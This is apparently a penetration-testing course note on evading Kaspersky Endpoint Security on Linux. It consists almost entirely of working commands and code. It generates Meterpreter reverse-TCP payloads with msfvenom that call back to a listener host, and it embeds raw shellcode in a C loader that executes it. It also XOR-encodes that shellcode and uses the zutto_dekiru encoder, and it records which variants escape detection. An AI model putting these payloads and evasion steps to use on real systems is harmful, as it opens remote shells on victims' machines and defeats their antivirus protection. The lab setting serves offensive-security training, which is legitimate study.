# Bypassing Antivirus

## Kaspersky Endpoint Security

### Scanning EICAR test file (Detected)

```bash
# Disabling realtime protection for our initial tests
sudo kesl-control --stop-t 1
# Repairing the EICAR file
cd /opt/av
sudo gpg -d eicar.txt.gpg > eicar.txt
# Ensure file exists
ls -al eicar.txt
# Scan file
sudo kesl-control --scan-file ./eicar.txt
# Check if file still exists
ls -al eicar.txt
# Viewing EICAR test file scan output
sudo kesl-control -E --query | grep DetectName
```

### Scanning a Meterpreter shell ELF (Gets detected)

{% code overflow="wrap" %}
```bash
# Generate shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.49.79 -f elf -o met.elf
# Copy shellcode to victim
scp met.elf offsec@$ip:/tmp/met.elf
# Start scan of file
sudo kesl-control --scan-file /tmp/met.elf
# Viewing met.elf file scan output
sudo kesl-control -E --query | grep DetectName
```
{% endcode %}

### Scanning Zutto\_Dekiru-encoded Meterpreter shell ELF (Not Detected)

{% code overflow="wrap" %}
```bash
# Generate shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.49.79 -e x64/zutto_dekiru -f elf -o met64zutto.elf
# Copy shellcode to victim
scp met64zutto.elf offsec@$ip:/tmp/
# Start scan of file
sudo kesl-control --scan-file /tmp/met64zutto.elf
```
{% endcode %}

### Unencoded x64 payload into a C program (Not detected)

```bash
# Re-enabling realtime protection for our initial tests
sudo kesl-control --start-t 1
# Generate shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.49.79 -f c
# Copy the below into hack.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our payload generated by msfvenom
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x4f\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv) 
{
	// Run our shellcode
	int (*ret)() = (int(*)())buf;
  	ret();

}
# Copy C program to victim
scp hack.c offsec@$ip:/tmp/
# Setup listener in metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LPORT 443
exploit
# Compile C program
gcc -o hack.out hack.c -z execstack
# Run exploit
./hack.out
# Scan file with Kaspersky
sudo kesl-control --scan-file ./hack.out
```

### Encoded Shellcode

#### Code to XOR encode our shellcode and output to the screen

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x4f\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv) 
{
        char xor_key = 'X';
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
                printf("\\x%02X",buf[i]^xor_key);
        }

        return 0;

}
```

#### Compile Encoder

```bash
gcc -o encoder.out encoder.c
```

#### **Run Encoder**

```bash
./encoder.out
```

#### **Updated C wrapper program with our encoded shellcode**

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our obfuscated shellcode
unsigned char buf[] = "\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48";

int main (int argc, char **argv) 
{
	char xor_key = 'X';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}
```
{% endcode %}

```bash
## Compile C program
gcc -o hack2.out hack2.c -z execstack
## Run exploit
./hack2.out
## Scan file with Kaspersky
sudo kesl-control --scan-file /tmp/hack2.out
```
